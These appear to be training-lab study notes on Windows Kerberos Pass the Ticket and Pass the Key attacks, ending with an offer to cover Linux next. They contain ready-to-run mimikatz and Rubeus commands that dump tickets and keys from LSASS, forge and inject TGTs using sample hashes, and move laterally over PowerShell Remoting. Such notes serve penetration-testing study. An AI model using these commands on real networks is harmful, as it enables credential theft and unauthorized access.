## 1. Overview & Kerberos Refresher

- **Concept:** Instead of using NTLM password hashes (like in Pass the Hash), a PtT attack uses **valid Kerberos tickets** to authenticate and move laterally.
    
- **Key Ticket Types:**
    - **TGT (Ticket Granting Ticket):** Obtained after initial authentication; allows the client to request service tickets (TGS) for any accessible resource.
    - **TGS (Ticket Granting Service):** A service ticket used to authenticate against a specific resource/service.
- **LSASS:** On Windows, Kerberos tickets are processed and stored by the **LSASS** (Local Security Authority Subsystem Service) process. Local administrators can harvest all tickets from LSASS, whereas standard users can only access their own.

## 2. Harvesting Kerberos Tickets from Windows
### Mimikatz
- **Exporting Tickets:** Extracts all current tickets from memory into `.kirbi` file formats.
    ```PowerShell
    mimikatz.exe privilege::debug "sekurlsa::tickets /export" exit
    ```
    - _Note:_ Files ending with `$` belong to computer accounts. User tickets typically follow the naming convention `[randomvalue]-username@service-domain.local.kirbi`.
### Rubeus
- **Dumping Tickets:** Dumps all tickets in **Base64** format directly to the console instead of writing files to disk.
    ```PowerShell
    Rubeus.exe dump /nowrap
    ```
    

## 3. Pass the Key / OverPass the Hash

If you have a user's encryption keys/hashes (`rc4_hmac`, `aes256_cts_hmac_sha1`), you can convert them into a full TGT rather than relying on NTLM-only workflows.
### Extracting Kerberos Keys via Mimikatz
```PowerShell
mimikatz.exe privilege::debug "sekurlsa::ekeys" exit
```
### Forging Tickets

- **Mimikatz (Pass the Key):** Spawns a new command prompt under the target user's context using their NTLM/RC4 hash.
    ```PowerShell
    mimikatz.exe privilege::debug "sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f" exit
    ```
    
- **Rubeus (`asktgt`):** Uses strong encryption (like AES-256) to request a fresh TGT from the KDC.
    ```PowerShell
    Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
    ```

## 4. Injecting and Using Tickets (Pass the Ticket)

Once you have a ticket (as a `.kirbi` file or Base64 string), you can inject it into your current logon session.
### Rubeus Injection Methods

- **Request and Inject Simultaneously (`/ptt`):**
    ```PowerShell
    Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
    ```
    
- **Injecting from Disk (`.kirbi`):**
    ```PowerShell
    Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
    ```
    
- **Injecting via Base64 String:** _(Convert local `.kirbi` to Base64 via PowerShell if needed: `[Convert]::ToBase64String([IO.File]::ReadAllBytes("ticket.kirbi"))`)_
    ```PowerShell
    Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaED...
    ```

### Mimikatz Injection Method

```PowerShell
mimikatz.exe privilege::debug "kerberos::ptt \"C:\path\to\ticket.kirbi\"" exit
```

## 5. Lateral Movement via PowerShell Remoting
PowerShell Remoting uses ports **TCP/5985 (HTTP)** and **TCP/5986 (HTTPS)**. Combining it with PtT allows remote administration under the injected user context.
### Method A: Mimikatz + PowerShell Remoting
1. Inject the ticket into a command prompt session using Mimikatz:
    ```PowerShell
    mimikatz.exe privilege::debug "kerberos::ptt \"C:\path\to\ticket.kirbi\"" exit
    ```
    
2. Launch PowerShell from that same window and connect to the target:
    ```PowerShell
    powershell
    Enter-PSSession -ComputerName DC01
    ```
### Method B: Rubeus Sacrificial Process (`createnetonly`)
To prevent overwriting or erasing existing TGTs in your primary session, use a sacrificial logon session (Logon Type 9):

1. **Create the sacrificial process:**
    ```PowerShell
    Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
    ```
    
2. **Request and inject the TGT** from the newly spawned command prompt window:
    ```PowerShell
    Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
    ```
    
3. Proceed to execute remote management commands or PowerShell Remoting sessions from that window.

Would you like to move on to covering Pass the Ticket attacks from Linux environments next?